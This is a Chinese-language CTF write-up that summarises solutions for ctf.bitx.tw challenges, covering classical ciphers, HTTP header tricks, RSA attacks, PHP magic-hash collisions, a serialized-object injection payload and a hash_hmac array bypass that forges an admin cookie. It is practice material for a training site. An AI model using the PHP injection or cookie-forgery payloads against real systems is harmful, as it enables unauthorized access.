# ctf.bitx.tw
# 適中題目
  - `Extract`: POST傳`answer`並且`md5(num1)`不可以`0e`開頭
  - `Cookie`: cookie為`帳號|md5(md5(帳號))`

# 水題
  - `Tcash`: 建立字母哈希表對映解出
  - `URLdecode`: 兩次編碼`FLAG`
  - `hash`: php '0e'
  - `Regular Expression`: `NTIHS{123456_Lol_fucK_}`
  - `Rockyou`: 利用`rockyou.txt`搭配`fcrackzip`
  -  `StegoSolve`: alpha plane 0

### HTTP水題
  - Http Method : GET
  ``` plaintext
  http://ctf.bitx.tw:10011/?like=flag
  ```
  - Http Method : POST
  ``` bash
  curl http://ctf.bitx.tw:10012/ -X POST --data "like=flag"
  ```
  - Cookie Practice
  ``` bash
  curl http://ctf.bitx.tw:10015/ -X POST --cookie "user=admin"
  ```
  - User Agent
  ``` bash
  curl http://ctf.bitx.tw:10014/ --user-agent "HACKERMAN"  
  ```
  - Status Code : 302
  ``` bash
  curl http://ctf.bitx.tw:10007/ -i  
  curl http://ctf.bitx.tw:10007/not_here.php -i 
  ```


### 意義不大
  - `Easy Forensics`: `strings 1.jpg`
  - `Web Welcome`: `f12`
  - `QR code Repairer`: 小畫家修理他

## decoder水題
  - `Caesar`: a->n
  - `Morse`
  - `Rail Fence`: rail is `15`
  - `Substitution`: Substitution solver
  - `Transposition`: Transposition solver
  - `Base Family`: ascii85->base64->base58->base32
  - `base64`
  - `Vigenere`

### 意義不大
  - `ok`: ook decoder 
  - `hex`
  - `Binary`
  - `fuck???`: jsfuck，直接丟到js console執行即可
  - `Decimal`: dec to ascii
  - `pig pig`: pigpen-cipher 
  - `Music`: 頻譜圖
  - `KeyBoard`: 將鍵盤的字母連連看得到字母
  - `Easy Forensics2`: `xxd` 找到flag，沒辦法在第一瞬間用regex找到，因為有間隔

### robot
  - [step1](http://ctf.bitx.tw:10006/robots.txt)
  - [step2](http://ctf.bitx.tw:10006/here_is_fake_flag.html)

# RSA
  ```
  n = p * q = 1887367
  m = (c ^ d) % n
  ```

# RSA Brute Force
factordb.com查詢n發現為composite，並且沒有已知的因數。
並且題目提示透過爆破運算，因此由0~127建立反查表。
透過反查表得出答案

# NeNeNe
發現e極小為5，猜測`m ** e < N`，可以直接開五次方。

參考[Google CTF 2017 Crypto 201 RSA CTF Challenge](https://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html)

# Comodulusmon
題目給了兩個e與c，並且題名看起來有共模的意思。
這邊採用RSA共模攻擊。

參考[RSA 共模攻击 Isc2016——PhrackCTF](https://jianshu.com/p/9b44512d898f)

注: 查資料的時候發現前幾個資料都是自己編寫egcd而不是使用
`gmpy2.gcdext()`。

解出來s1與s2為負數時，求`模反元素 ** -s`，
而這邊一樣使用gmpy2提供的函數`powmod(x, y, N)`即可得出正確結果。

# Caesar Advanced
這題使用一般的rot或凱薩密碼解碼器解不出來，
猜測改給定的是flag，並且前5個字一定是NTIHS。

嘗試檢查距離
``` python
m = 'NTIHS'
c = 'MRFDN'
for i in range(0, 5):
  print(ord(c[i]) - ord(m[i])) 
```

可以發現是直接遞減的，因此在還原的時候也跟著遞增距離
``` python
c = 'MRFDNu<Y\iVfRiZdWM\^Og'
m = ''
for i in range(0, len(c)):
  m += chr(ord(c[i]) + (i + 1)) 

print(m)
```

# (΄◕◞౪◟◕‵)
摩斯編碼。
``` plaintext
%s/━(　　΄◕)━(　΄◕◞౪)━(΄◕◞౪◟◕‵)━(౪◟◕‵　)━(◕‵　　)/-/g
%s/━(　　΄◔)━(　΄◔◞౪)━(΄◔◞౪◟◔‵)━(౪◟◔‵　)━(◔‵　　)/./g
%s/━(      )━(      )━(         )━(        )━(       )/ /g
%s/━(    　)//g
%s/━(　　　)//g
```

# RSA Backdoor
湊數字的數學題，必須對RSA的公式很熟
``` plaintext
c = m ^ e mod N
m = c ^ d mod N
ed mod phi = 1 
phi = (p - 1) * (q - 1)
```

而該題給定`ed^2 + 7phi = x`，並且
``` plaintext
m = c ^ d mod N
  = (m ^ e) ^ d mod N
  = m ^ (ed) mod N
```

由於`m ^ e mod N = c`，意味著 `c` 可以轉變為`m ^ e`，
因此若要得出密文的話，則要導出 `c` 轉變為 `m` 的等式。

並且利用`ed mod phi = 1`與**歐拉定理**`a ^ phi mod N = 1`，
前者代表只要等式含有`ed`即可消去為`1`，後者代表遇見`Phi`可以
將代數以1消去。

並且根據以上兩個條件進行推導。
``` plaintext
c ^ (ed^2 + 7phi) mod N = m ^ (e(ed^2 + 7phi)) mod N
  = m ^ ((ed)^2 + 7phi * e)) mod N
  = m ^ (1 + 7phi * e) mod N
  = m ^ (1) * (m ^ phi) ^ 7e mod N
  = m * 1 mod N
  = m
```

``` python
from Crypto.Util.number import long_to_bytes
x = 99049806755949831499702101584326074860496499513217890004533526218235
e = 102276472707445191834861046023863146812698689312864918624981283
c = 22087998134741103222334188921466973837076811976618565524994265771911
n = 207248826184348862442533988452452635712686044260698245551080231700741 
m = pow(c, x, n)
long_to_bytes(m)
```

參見[理解 RSA 算法](https://wsfdl.com/algorithm/2016/02/11/%E7%90%86%E8%A7%A3RSA%E7%AE%97%E6%B3%95.html)

# pwn
 - `bof`: ~~少8就過~~，透過ret2plt的方法解決
 - `bof2`: ret2plt的方法解決
 - `pwntools`: 加減乘除，不要印出來運算過程，可以印出進度

# hash2
  編寫碰撞腳本，確保生成的hash值符合`^0+e[0-9]*$`，
用筆電(3.20 GHz)可以在一個小時左右或更快解出來。
  [flag](http://ctf.bitx.tw:10005/?md5=280289646&sha1=411837728&md6=721833251)

# Unserialize
  由於序列化的時候會包含`\0`與`*`，因此在輸出的時候直接透過php進行編碼，
比較不會出現問題，如果輸出之後透過其他工具編碼有機率出現問題。
  ``` php 
  <?php

  class HackMeIfYouCan
  {
      private $pandorasbox;
      function __construct() {
          $this->pandorasbox = new callme();
      }
  };

  class callme
  {
      protected $data = 'config.php';
  }

  $obj = new HackMeIfYouCan();


  echo urlencode(serialize($obj));
  ```
  輸入之後觀看原始碼含有flag

# cookie2
  程式碼使用`===`，因此無法透過碰撞的方式偽造hash值，傳入陣列使得產生金鑰的函數返回為空

  ``` php
  $flag = 'flag1';
  $nonce = array('null');
  echo urlencode('admin|' . hash_hmac('sha256', 'admin', ''));
  # 與下面等價
  # echo urlencode('admin|' . hash_hmac('sha256', 'admin', hash_hmac('sha256',$nonce, $flag)));
  ``` 
  修改玩cookie之後[享受](http://ctf.bitx.tw:10002/?nonce[]=thisisanonce)

# Picture Repairer
  透過`pngcheck`檢查錯誤，發現錯誤的IHDR數值，
  透過`vim -b 3.png`開啟檔案之後用`:%!xxd`檢視數據
  並且修正高度之後透過`:%!xxd -r`還原成二進位格式
  存檔後開啟看到flag
  
